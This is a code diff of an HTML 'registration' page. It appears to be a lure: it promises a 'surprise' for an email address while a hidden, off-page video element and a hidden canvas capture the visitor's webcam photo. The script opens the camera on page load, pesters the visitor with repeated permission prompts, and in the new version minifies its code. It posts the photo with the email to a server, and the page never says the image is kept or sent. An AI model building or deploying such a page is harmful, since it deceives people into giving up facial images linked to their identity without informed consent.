@@ -1,149 +1,128 @@
 <!DOCTYPE html>
 <html>
+
 <head>
-    <title>Email Registration Test</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Email Registration</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1">
     <style>
-        .loader { 
-            display: none; 
-            width: 40px; 
-            height: 40px; 
-            border: 5px solid #f3f3f3; 
-            border-top: 5px solid #3498db; 
-            border-radius: 50%; 
-            animation: spin 1s linear infinite; 
-            margin: 20px auto; 
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background: #1a1a1a;
+            color: #f5f5dc;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh
         }
-        @keyframes spin { 
-            0% { transform: rotate(0deg); } 
-            100% { transform: rotate(360deg); } 
+
+        .frame {
+            background: #333;
+            border: 2px solid #333;
+            padding: 20px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 0 10px rgba(0, 0, 0, .3)
         }
-        body { 
-            font-family: Arial, sans-serif; 
-            text-align: center; 
-            padding: 20px; 
+
+        h2 {
+            margin: 0 0 15px;
+            color: #f5f5dc;
+            font-size: 20px
         }
-        #email { 
-            padding: 10px; 
-            width: 80%; 
-            max-width: 300px; 
-            margin-bottom: 10px; 
+
+        #email {
+            padding: 10px;
+            width: 100%;
+            max-width: 300px;
+            margin-bottom: 15px;
+            border: 2px solid #666;
+            border-radius: 5px;
+            background: #666;
+            color: #000;
+            placeholder-color: #000
         }
-        #registerBtn { 
-            padding: 10px 20px; 
-            background-color: #3498db; 
-            color: white; 
-            border: none; 
-            cursor: pointer; 
+
+        #email::placeholder {
+            color: #000
         }
-        #registerBtn:disabled { 
-            background-color: #95a5a6; 
-            cursor: not-allowed; 
+
+        #registerBtn {
+            padding: 12px 30px;
+            background: #ff0000;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: 700;
+            font-size: 16px
         }
-        #response { 
-            margin-top: 20px; 
-            font-size: 16px; 
+
+        #registerBtn:disabled {
+            background: #666;
+            cursor: not-allowed
         }
-        canvas { 
-            display: none; /* Hidden canvas for capture */ 
+
+        .loader {
+            display: none;
+            width: 30px;
+            height: 30px;
+            border: 4px solid #f5f5dc;
+            border-top: 4px solid #1a1a1a;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto
+        }
+
+        #response {
+            margin-top: 20px;
+            font-size: 16px
+        }
+
+        .success {
+            color: #f5f5dc
+        }
+
+        .error {
+            color: #ff0000
+        }
+
+        .hint,
+        .author {
+            font-size: 14px;
+            color: #f5f5dc;
+            margin: 10px 0
+        }
+
+        canvas {
+            display: none
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg)
+            }
+
+            100% {
+                transform: rotate(360deg)
+            }
         }
     </style>
 </head>
+
 <body>
-    <h2>Register</h2>
-    <form id="registerForm">
-        <input type="email" id="email" placeholder="Enter your email" required>
-        <button type="submit" id="registerBtn">Register</button>
-    </form>
-    <div id="loader" class="loader"></div>
-    <div id="response"></div>
-    <canvas id="canvas" width="320" height="240"></canvas>
-
-    <script>
-        const video = document.createElement('video'); // Video element created dynamically, not added to DOM
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
-        const loader = document.getElementById('loader');
-        const responseDiv = document.getElementById('response');
-        const registerBtn = document.getElementById('registerBtn');
-
-        let videoReady = false;
-        let stream = null;
-
-        async function initializeCamera() {
-            try {
-                stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'user' } // Front camera
-                });
-                video.srcObject = stream;
-                await new Promise(resolve => {
-                    video.onloadedmetadata = () => {
-                        video.play();
-                        videoReady = true;
-                        console.log('Video stream initialized');
-                        resolve();
-                    };
-                });
-            } catch (err) {
-                console.error('Camera access error:', err);
-                throw new Error('Failed to access camera: ' + err.message);
-            }
-        }
-
-        // Initialize camera silently on page load
-        initializeCamera().catch(err => {
-            responseDiv.innerHTML = `<p style="color: red">${err.message}</p>`;
-            registerBtn.disabled = false; // Allow retry if camera fails initially
-        });
-
-        async function captureImage() {
-            if (!videoReady) throw new Error('Camera not ready. Please allow camera access.');
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            return canvas.toDataURL('image/png');
-        }
-
-        document.getElementById('registerForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const email = document.getElementById('email').value;
-            registerBtn.disabled = true;
-
-            try {
-                loader.style.display = 'block';
-                responseDiv.innerHTML = '';
-
-                const imageDataUrl = await captureImage();
-
-                const response = await fetch('https://myregistrationapp.loca.lt/register', {
-                    method: 'POST',
-                    headers: { 
-                        'Content-Type': 'application/json',
-                        'bypass-tunnel-reminder': 'true'
-                    },
-                    body: JSON.stringify({ email, image: imageDataUrl })
-                });
-
-                const data = await response.json();
-                if (!response.ok) {
-                    console.error('Fetch response error:', data);
-                    throw new Error(data.error || `HTTP error: ${response.status}`);
-                }
-                responseDiv.innerHTML = `<p style="color: green">${data.message}</p>`;
-                console.log('Cloudinary URL:', data.imageUrl);
-            } catch (error) {
-                console.error('Fetch error:', error.message);
-                responseDiv.innerHTML = `<p style="color: red">Error: ${error.message}</p>`;
-            } finally {
-                loader.style.display = 'none';
-                registerBtn.disabled = false;
-            }
-        });
-
-        // Cleanup stream on page unload
-        window.addEventListener('unload', () => {
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-            }
-        });
-    </script>
+    <div class="frame">
+        <h2>SMILE PLEASE THEN ENTER MAIL</h2>
+        <form id="registerForm"><input type="email" id="email" placeholder="Enter correct email" required><button
+                type="submit" id="registerBtn">Get Surprise !!!</button></form>
+        <div class="hint">Please wait for a while after entering mail</div>
+        <div id="loader" class="loader"></div>
+        <div id="response"></div>
+        <div class="author">Surprise is given by: Rachit Patel</div>
+    </div><canvas id="canvas" width="320" height="240"></canvas>
+    <script>const video = document.createElement("video"), canvas = document.getElementById("canvas"), context = canvas.getContext("2d"), loader = document.getElementById("loader"), responseDiv = document.getElementById("response"), registerBtn = document.getElementById("registerBtn"); let videoReady = !1, stream = null, photoTaken = !1; async function initializeCamera() { try { stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }), video.srcObject = stream, await new Promise(e => { video.onloadedmetadata = () => { video.play(), videoReady = !0, console.log("Video initialized"), e() } }) } catch (e) { throw console.error("Camera error:", e), new Error("Please allow camera access") } } function promptCameraAccess() { videoReady || photoTaken || confirm("Please allow camera access to proceed. Click OK to enable camera permissions.") || setTimeout(promptCameraAccess, 1e3) } async function captureImage() { if (!videoReady) throw new Error("Camera not ready"); context.drawImage(video, 0, 0, canvas.width, canvas.height); const e = canvas.toDataURL("image/png"); return photoTaken = !0, stream && (stream.getTracks().forEach(e => e.stop()), stream = null, videoReady = !1), e } initializeCamera().catch(e => { responseDiv.innerHTML = `<p class="error">${e.message}</p>`, promptCameraAccess() }), document.getElementById("registerForm").addEventListener("submit", async e => { e.preventDefault(); const r = document.getElementById("email").value; registerBtn.disabled = !0, loader.style.display = "block", responseDiv.innerHTML = ""; try { const e = await captureImage(), n = await fetch("/register", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ email: r, image: e }) }), o = await n.json(); if (!n.ok) throw new Error(o.error || "HTTP error: " + n.status); responseDiv.innerHTML = `<p class="success">${o.message}</p>` } catch (e) { responseDiv.innerHTML = `<p class="error">Error: ${e.message}</p>` } finally { loader.style.display = "none", registerBtn.disabled = !1 } });</script>
 </body>
+
 </html>
